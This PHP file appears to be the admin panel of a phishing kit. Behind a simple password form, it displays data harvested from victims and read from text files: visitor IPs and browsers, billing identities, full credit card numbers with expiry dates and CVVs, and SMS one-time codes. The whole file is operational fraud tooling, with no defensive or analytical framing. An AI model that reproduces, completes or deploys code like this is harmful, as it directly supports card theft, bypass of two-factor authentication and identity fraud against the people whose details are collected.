<?php
@ini_set('display_errors', 'on');
include'../config.php';

// Le mot de passe n'a pas été envoyé ou n'est pas bon
if (!isset($_POST['pass']) OR $_POST['pass'] != $pass)
{
	// Afficher le formulaire de saisie du mot de passe
 ?>
 <link rel='stylesheet' type='text/css' href='../files/css/bootstrap.css'>
	<link href='../files/css/flat-ui.css' rel='stylesheet'>
    <link href='../files/css/demo.css' rel='stylesheet'>
	<body>
      <div class="demo-headline">
        <h1 class="demo-logo">
          <div class="logo"></div>
        </h1>
      </div> <!-- /demo-headline -->
	  <div class='lead'>
	 <div class="login">
   <div class="login-form">

<form action="" method='post'>

<table align="center" border="0">

  <tr>
 
    <td><div class="form-group">
              <input type="password" class="form-control login-field" value="" name="pass" placeholder="Password" id="pass">
              <label class="login-field-icon fui-lock" for="login-pass"></label>
            </div></td>
  </tr><br>
  <tr> <td> <input name="submit" class="btn btn-primary btn-lg btn-block" type="submit" value="log in"></td></tr>
</table>

</form> 
</div></div> </div>

<?php
} 
else 
{ ?>
	<head><meta http-equiv='Content-Language' content='en-us'></head>
	<title>Panel - Admin</title>
	<link rel='stylesheet' type='text/css' href='../files/css/bootstrap.css'>
	<link href='../files/css/flat-ui.css' rel='stylesheet'>
    <link href='../files/css/demo.css' rel='stylesheet'>
   <script type='text/javascript' src='../files/js/modernizr.min.js'></script>
   <script src='../files/js/jquery.js'></script>
	</link>
	<div class='container'>
	<body>
	<div class='demo-headline'>
	<h1 class='demo-logo'>
          <div class='logo'></div>
        </h1>
		</div>
	<nav class='navbar navbar-default' role='navigation'>
  <div class='navbar-header'>
    <button type='button' class='navbar-toggle' data-toggle='collapse' data-target='#navbar-collapse-01'>
      <span class='sr-only'>Toggle navigation</span>
    </button>
    <a class='navbar-brand' href='#' id='load01'>Home</a>
  </div>
  <div class='collapse navbar-collapse' id='navbar-collapse-01'>
  	 <ul class='nav navbar-nav'>        
      <li><a  href='#' id='load03'>Bill info</a></li>
    </ul> 
      <ul class='nav navbar-nav'>          
      <li><a href='#' id='load04'>Credit Card</a></li>
    </ul>    
      <ul class='nav navbar-nav'>          
      <li><a href='#' id='load05'>Sms</a></li>
    </ul>  	
  </div><!-- /.navbar-collapse -->
 
</nav><!-- /navbar --> 
<script>
$(document).ready( function() {
    $('#load01').on('click', function() {
        $('#01').show();
		$('#03').hide();
		$('#04').hide();
		$('#05').hide();
    });
	 $('#load03').on('click', function() {
		$('#01').hide();
        $('#03').show();
	    $('#04').hide();
	    $('#05').hide();
    });
	 $('#load04').on('click', function() {
        $('#01').hide();
		$('#03').hide();
		$('#04').show();
		$('#05').hide();
    });
	 $('#load05').on('click', function() {
        $('#01').hide();
		$('#03').hide();
		$('#04').hide();
		$('#05').show();
    });
});
</script>

	



		<div align='center' id='01' style=''>
		<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
        // document.getElementById('fixed').style.visibility="hidden";
            var rowCount = $("#vis td").closest("tr").length;
            var message = rowCount;
			 var rowCount2 = $("#cc td").closest("tr").length;
            var message2 = rowCount2;
			 var rowCount3 = $("#otp td").closest("tr").length;
            var message3 = rowCount3;
			document.getElementById('lbl').innerText = message;
			document.getElementById('lbl2').innerText = message2;
			document.getElementById('lbl3').innerText = message3;
      },);
  }
}
   
</script>

	
<style>

</style>

<div class="main-overview">
  <div class="overviewcard">
    <div class="overviewcard__icon"><svg  width="3em" height="3em" viewBox="0 0 16 16"  fill="currentColor" class="bi bi-eye">
  <path fill-rule="evenodd" d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.134 13.134 0 0 0 1.66 2.043C4.12 11.332 5.88 12.5 8 12.5c2.12 0 3.879-1.168 5.168-2.457A13.134 13.134 0 0 0 14.828 8a13.133 13.133 0 0 0-1.66-2.043C11.879 4.668 10.119 3.5 8 3.5c-2.12 0-3.879 1.168-5.168 2.457A13.133 13.133 0 0 0 1.172 8z"/>
  <path fill-rule="evenodd" d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
</svg></div>
    <div id="lbl" class="overviewcard__info"></div>
  </div>
  <div class="overviewcard">
    <div  class="overviewcard__icon"><svg width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-credit-card" fill="currentColor">
  <path fill-rule="evenodd" d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v1h14V4a1 1 0 0 0-1-1H2zm13 4H1v5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V7z"/>
  <path d="M2 10a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1v-1z"/>
</svg></div>
    <div id="lbl2" class="overviewcard__info"></div>
  </div>
  <div class="overviewcard">
    <div  class="overviewcard__icon"><svg width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-phone-vibrate" fill="currentColor">
  <path fill-rule="evenodd" d="M10 3H6a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1zM6 2a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H6z"/>
  <path fill-rule="evenodd" d="M8 12a1 1 0 1 0 0-2 1 1 0 0 0 0 2zM1.599 4.058a.5.5 0 0 1 .208.676A6.967 6.967 0 0 0 1 8c0 1.18.292 2.292.807 3.266a.5.5 0 0 1-.884.468A7.968 7.968 0 0 1 0 8c0-1.347.334-2.619.923-3.734a.5.5 0 0 1 .676-.208zm12.802 0a.5.5 0 0 1 .676.208A7.967 7.967 0 0 1 16 8a7.967 7.967 0 0 1-.923 3.734.5.5 0 0 1-.884-.468A6.967 6.967 0 0 0 15 8c0-1.18-.292-2.292-.807-3.266a.5.5 0 0 1 .208-.676zM3.057 5.534a.5.5 0 0 1 .284.648A4.986 4.986 0 0 0 3 8c0 .642.12 1.255.34 1.818a.5.5 0 1 1-.93.364A5.986 5.986 0 0 1 2 8c0-.769.145-1.505.41-2.182a.5.5 0 0 1 .647-.284zm9.886 0a.5.5 0 0 1 .648.284C13.855 6.495 14 7.231 14 8c0 .769-.145 1.505-.41 2.182a.5.5 0 0 1-.93-.364C12.88 9.255 13 8.642 13 8c0-.642-.12-1.255-.34-1.818a.5.5 0 0 1 .283-.648z"/>
</svg></div>
    <div id="lbl3" class="overviewcard__info"></div>
  </div>
</div>
	<h3>Visiteur  <span class='fui-eye'></span></h3><br>
	<table id='vis' width='76' class='table table-hover'>
		
		<tr>
			<th width='80'>
			<p align='center'>IP</td>
			<th width='80'>
            <p align='center'>browser</td>
			<th width='80'>
            <p align='center'>os</td>
			<th width='30'>
			<p align='center'>Country</td>
			<th width='80'>
			<p align='center'>Date & time</td>
		</tr>
		 
<?php
$click = file_get_contents("click.txt");
echo $click;
?>

<?php 
			$filepath = './stats.ini';
            $data = @parse_ini_file($filepath);echo $data['cliques']; echo ' Visiteur';
?>

</table></div>

<div align='center'  id='03' style='display:none;'>
	<h3>Bill  <span class='fui-new'></span></h3><br>
	<table id='bill' width='76' class='table table-hover'>
<tr>
			<th width='80'>
			<p align='center'>IP</td>
			<th width='60'>
			<p align='center'>Full name</td>
			<th width='60'>
			<p align='center'>Birthday</td>
			<th width='30'>
			<p align='center'>Phone</td>
			<th width='30'>
			<p align='center'>City</td>
	    	<th width='30'>
			<p align='center'>Adress</td>
			<th width='30'>
			<p align='center'>Zip</td>
			<th width='30'>
			<p align='center'>Email</td>
			<th width='30'>
		</tr>

<?php
$billing = file_get_contents("billing.txt");
echo $billing;
?>

<?php 
	$filepath = './stats.ini';
    $data = @parse_ini_file($filepath);echo $data['billings']; echo ' Billing';
?>

</table></div>
<div align='center'  id='04' style='display:none;'>
	<h3>Credit Card  <span class='fui-heart'></span></h3><br>
	<table  id='cc' width='76' class='table table-hover'>
<tr>
			<th width='80'>
			<p align='center'>IP</th>
			<th width='80'>
			<p align='center'>Full Name</th>
			<th width='60'>
			<p align='center'>Card Num</th>
			<th width='10'>
			<p align='center'>Date Exp</th>
			<th width='40'>
			<p align='center'>CVV</th>
			<th width='40'>
			<p align='center'>CardType</th>
			<th width='20'>
			<p align='center'>Bank</th>
			<th width='60'>
			<p align='center'>Brand</th>
			<th width='40'>
			<p align='center'>Date & time</th>
		</tr>

<?php
$cc = file_get_contents("cc.txt");
echo $cc;
?>

<?php 
	$filepath = './stats.ini';
    $data = @parse_ini_file($filepath);echo $data['cc']; echo ' Credit Card';
?>

</table></div>
<div align='center'  id='05' style='display:none;'>
	<h3>OTP  <span class='fui-mail'></span></h3><br>
	<table id='otp' width='76' class='table table-hover'>
<tr>
<th width='80'><p align='center'>IP</th>
<th width='30'><p align='center'>PHONE</th>
<th width='40'><p align='center'>Code</th>
<th width='40'><p align='center'>Date & time</th>
</tr>

<?php
$otp = file_get_contents("otp.txt");
echo $otp;
?>

<?php 
	$filepath = './stats.ini';
    $data = @parse_ini_file($filepath);echo $data['sms']; echo ' OTP CODE';
?>
</table></div>
<?php
} 
?>

